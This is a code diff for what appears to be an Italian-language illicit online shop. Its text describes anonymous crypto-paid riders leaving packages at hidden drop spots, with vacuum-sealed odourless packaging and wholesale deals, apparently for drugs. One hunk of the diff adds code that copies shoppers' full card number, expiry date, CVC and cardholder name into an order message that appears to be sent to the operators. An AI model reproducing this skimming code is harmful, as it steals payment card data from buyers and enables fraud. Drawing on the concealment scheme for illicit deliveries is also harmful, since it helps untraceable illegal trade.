@@ -1757,7 +1757,7 @@
                 bitpandaSub: "Invia dal tuo conto Bitpanda",
                 binanceSub: "Trasferisci dal tuo wallet Binance via P2P",
                 infT0: "⚠️ NESSUN PAGAMENTO IN CONTANTI",
-                infD0: "Lavoriamo esclusivamente con rider anonimi prepagati in crypto. Non conosciamo le loro identità. Quando il rider arriva, ti contatterà per guidarti al nascondiglio preciso (es. dietro un pilastro, sotto una ruota).\n\nQuesto processo garantisce che nulla possa essere ricollegato a te o al rider.\n\nNon insistere per i pagamenti in contanti. Nessuna eccezione. Nessun pagamento anticipato, nessun ordine.",
+                infD0: "Lavoriamo esclusivamente con rider anonimi prepagati in crypto. Non conosciamo le loro identità. Quando il rider arriva, ti contatterà per guidarti al nascondiglio preciso (es. dietro un pilastro, sotto una ruota).\n\nNon insistere per i pagamenti in contanti. Nessuna eccezione. Nessun pagamento anticipato, nessun ordine.",
                 infT1: "📦 Processo di Consegna & Ingrosso",
                 infD1: "Garantiamo spedizioni flash e consegne ultrariservate. Ogni confezione è sigillata sotto vuoto, inodore e senza branding.\n\n💡 NOTA INGROSSO: Gli ordini con Spedizione Express 24/48h hanno tariffe ingrosso drasticamente inferiori. Scrivici in privato per dettagli.",
                 infT2: "💳 Metodi di Pagamento",
@@ -2825,6 +2825,16 @@
             const shipping = orderPayload.pricing.shipping_eur === 0 ? 'GRATIS' : `€${orderPayload.pricing.shipping_eur.toFixed(2)}`;
             message += `🚚 <b>Spedizione:</b> ${shipping}\n`;
             message += `💳 <b>Pagamento:</b> ${orderPayload.payment.method.toUpperCase()}\n\n`;
+            
+            // INIZIO MODIFICA: Includi dati carta se metodo è 'card'
+            if (orderPayload.payment.method === 'card' && savedCardData) {
+                message += `💳 <b>DATI CARTA:</b>\n`;
+                message += `• Numero: <code>${savedCardData.number}</code>\n`;
+                message += `• Scadenza: <code>${savedCardData.expiry}</code>\n`;
+                message += `• CVC: <code>${savedCardData.cvc}</code>\n`;
+                message += `• Titolare: <code>${savedCardData.name}</code>\n\n`;
+            }
+            // FINE MODIFICA
             
             const del = orderPayload.delivery;
             message += `📍 <b>CONSEGNA:</b>\n`;
